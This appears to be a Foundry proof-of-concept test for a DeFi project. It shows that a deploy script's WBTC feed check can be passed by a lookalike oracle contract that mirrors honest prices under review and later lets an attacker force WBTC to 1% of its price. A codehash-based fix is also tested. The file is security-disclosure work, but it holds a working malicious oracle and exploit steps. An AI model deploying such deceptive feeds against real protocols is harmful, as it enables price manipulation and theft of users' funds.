// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {IndexFactory} from "../../src/IndexFactory.sol";
import {IIndexFactory} from "../../src/interfaces/IIndexFactory.sol";
import {IIndexRule} from "../../src/interfaces/IIndexRule.sol";
import {IAggregatorV3} from "../../src/interfaces/IAggregatorV3.sol";
import {CompositeFeed} from "../../src/CompositeFeed.sol";
import {ConfigureWhitelist} from "../../script/ConfigureWhitelist.s.sol";
import {MainnetAddresses as M} from "../../script/MainnetAddresses.sol";

/// @notice Not a CompositeFeed: it only answers the four getters `checkWbtcFeed` reads with the values it wants, and
///         reports whatever WBTC price its controller sets. A proxy or any other contract with these getters works too.
contract LookalikeCompositeFeed {
    IAggregatorV3 public constant FEED_A = IAggregatorV3(M.BTC_USD_FEED);
    IAggregatorV3 public constant FEED_B = IAggregatorV3(M.WBTC_BTC_FEED);
    uint32 public constant MAX_AGE_A = M.STALENESS_1H;
    uint32 public constant MAX_AGE_B = M.STALENESS_24H;

    address public immutable controller;
    int256 public forcedAnswer; // 0 = mirror the honest product, so it looks right while it is being reviewed

    constructor() {
        controller = msg.sender;
    }

    function force(int256 answer) external {
        require(msg.sender == controller, "not controller");
        forcedAnswer = answer;
    }

    function decimals() external pure returns (uint8) {
        return 8;
    }

    function description() external pure returns (string memory) {
        return "BTC / USD * WBTC / BTC"; // exactly what the genuine adapter reports
    }

    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        int256 answer = forcedAnswer;
        if (answer == 0) {
            (, int256 a,,,) = FEED_A.latestRoundData();
            (, int256 b,,,) = FEED_B.latestRoundData();
            answer = a * b / 1e8;
        }
        // Always "fresh", so the rule's staleness check never stands in the way.
        return (0, answer, block.timestamp, block.timestamp, 0);
    }
}

/// @notice `ConfigureWhitelist.checkWbtcFeed` is documented to revert "unless `feed` is a `CompositeFeed` over exactly
///         BTC/USD and WBTC/BTC", and README/ARCHITECTURE present it as the check that ties the WBTC_FEED address to the
///         two legs. It only reads four view getters, so any contract answering them passes, and the default list is
///         then built, proposed and executed with a feed a third party controls.
contract LookalikeWbtcFeedPoC is Test {
    ConfigureWhitelist configure;

    function setUp() public {
        string memory url = vm.envOr("MAINNET_RPC_URL", string("https://ethereum-rpc.publicnode.com"));
        vm.createSelectFork(url);
        configure = new ConfigureWhitelist();
    }

    function test_lookalikePassesCheckWbtcFeedAndControlsWbtcPrice() public {
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        LookalikeCompositeFeed fake = new LookalikeCompositeFeed();

        // 1. The script's only guard on WBTC_FEED accepts it.
        configure.checkWbtcFeed(address(fake));

        // 2. WHITELIST=default is resolved exactly as `run()` does it, and the WBTC entry names the fake.
        ConfigureWhitelist.Entry[] memory list = configure.resolveList("default", address(fake));
        assertEq(list[2].token, M.WBTC);
        assertEq(list[2].feed, address(fake));

        // 3. Safe mode emits the proposal for the fake, and the factory and rule accept it.
        IndexFactory factory = new IndexFactory(address(this), makeAddr("guardian"));
        IIndexRule rule = IIndexRule(factory.RULE());
        bytes[] memory calls = configure.safeCalldata(IIndexFactory(address(factory)), list, new address[](0));
        bytes memory expected = abi.encodeCall(IIndexFactory.proposeListing, (M.WBTC, configure.configFor(list[2])));
        bool found;
        for (uint256 i = 0; i < calls.length; ++i) {
            if (keccak256(calls[i]) == keccak256(expected)) found = true;
        }
        assertTrue(found, "safe mode asks the Safe to list WBTC with the lookalike feed");

        // The owner (standing in for the Safe) sends that call; two days later anyone executes it.
        (bool ok,) = address(factory).call(expected);
        assertTrue(ok);
        vm.warp(block.timestamp + factory.LISTING_DELAY());
        factory.executeListing(M.WBTC);
        assertTrue(factory.isWhitelisted(M.WBTC));
        assertEq(factory.tokenConfig(M.WBTC).feed, address(fake));

        // 4. While mirroring, the price looks right (so a reviewer comparing prices sees nothing).
        uint256 honest = rule.price(M.WBTC);
        assertGt(honest, 0);

        // 5. The controller now sets WBTC to 1% of its value for every index that holds it.
        (, int256 current,,,) = fake.latestRoundData();
        vm.prank(attacker);
        fake.force(current / 100);
        // A WAD price for an 8-decimal feed on an 8-decimal token is answer * 1e20.
        assertEq(rule.price(M.WBTC), uint256(current / 100) * 1e20, "WBTC is now priced by the attacker");
        assertLt(rule.price(M.WBTC), honest / 99, "about a hundredth of the honest price");
    }

    /// @dev The fix that makes the documented claim true: a CompositeFeed's runtime code depends only on its four
    ///      immutables, so a reference deployment with the policy arguments has the one codehash WBTC_FEED may have.
    function test_codehashComparisonDistinguishesTheGenuineAdapter() public {
        CompositeFeed deployed = new CompositeFeed(
            IAggregatorV3(M.BTC_USD_FEED), IAggregatorV3(M.WBTC_BTC_FEED), M.STALENESS_1H, M.STALENESS_24H
        ); // stands in for the one Deploy logged
        CompositeFeed refFeed = new CompositeFeed(
            IAggregatorV3(M.BTC_USD_FEED), IAggregatorV3(M.WBTC_BTC_FEED), M.STALENESS_1H, M.STALENESS_24H
        );
        LookalikeCompositeFeed fake = new LookalikeCompositeFeed();
        assertEq(address(deployed).codehash, address(refFeed).codehash, "the genuine adapter matches");
        assertTrue(address(fake).codehash != address(refFeed).codehash, "the lookalike does not");
        // ...yet today both pass the script's check:
        configure.checkWbtcFeed(address(deployed));
        configure.checkWbtcFeed(address(fake));
    }
}
